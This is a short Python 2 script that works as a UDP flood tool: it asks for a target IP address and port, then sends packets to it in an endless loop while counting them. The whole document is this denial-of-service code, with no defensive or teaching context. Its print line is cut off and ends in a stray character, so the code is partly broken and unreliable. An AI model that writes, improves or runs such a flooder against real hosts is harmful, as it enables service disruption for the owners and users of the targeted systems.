import os
import sys
import socket
import random

sock = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
bytes = random.randint(0,1024)

os.system ("clear")
os.system("ls")
os.system("clear")
print ("")
ip = raw_input ("\033[36;1m" "Target IP>>  ")
port = input ("\033[36;1m" "Port>> ")
sent = 0


while True:
        try:
                sock.sendto(str(bytes),( str(ip), port))
                sent = sent +1
                print "sent %d packets to %s through port %d."       >
        except KeyboardInterrupt:
                sys.exit()
